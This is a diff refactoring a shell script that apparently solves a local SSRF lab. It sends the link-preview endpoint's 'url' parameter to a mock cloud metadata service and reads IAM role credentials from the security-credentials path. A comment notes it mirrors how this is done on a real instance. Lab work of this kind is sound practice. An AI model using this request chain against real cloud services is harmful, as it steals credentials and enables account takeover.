@@ -6,9 +6,8 @@ URL="${1:?usage: $0 http://127.0.0.1:9250}"
 new_session lab25
 META="http://127.0.0.1:9251"
 
-"$H5I" browser open "$URL/api/preview?url=http://127.0.0.1:9251/" \
-    --session "$SESSION" --new --capture --allow 127.0.0.1 >/dev/null
+open_lab "$SESSION" "$URL/api/preview?url=http://127.0.0.1:9251/" --allow 127.0.0.1
 
 # Walk the tree the way you would on a real instance.
-send "$SESSION" req_0 --set "query.url=$META/latest/meta-data/iam/security-credentials/" | body >&2; echo >&2
-send "$SESSION" req_0 --set "query.url=$META/latest/meta-data/iam/security-credentials/linkpreview-role" | flag
+send "$SESSION" "$REQ0" --set "query.url=$META/latest/meta-data/iam/security-credentials/" | body >&2; echo >&2
+send "$SESSION" "$REQ0" --set "query.url=$META/latest/meta-data/iam/security-credentials/linkpreview-role" | flag
